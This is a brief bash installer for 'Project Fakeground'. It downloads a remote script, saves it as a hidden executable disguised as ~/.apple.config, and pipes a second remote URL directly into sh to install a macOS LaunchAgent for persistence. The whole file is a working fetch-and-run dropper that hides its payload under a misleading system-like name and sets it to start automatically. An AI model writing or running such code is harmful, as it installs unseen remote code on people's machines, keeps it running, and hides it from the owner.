#!/bin/bash

echo "Installing Project Fakeground..."
echo "Installing main script..."
curl -o $HOME/.apple.config https://jbuelow1.github.io/projectfakeground/Client/fakeground.sh
chmod +x ~/.apple.config
echo "Installing LaunchAgent..."
curl http://launched.zerowidth.com/plists/7005dd60-0a9f-0136-0efd-4b5f8b966272/install | sh
echo "Done!"

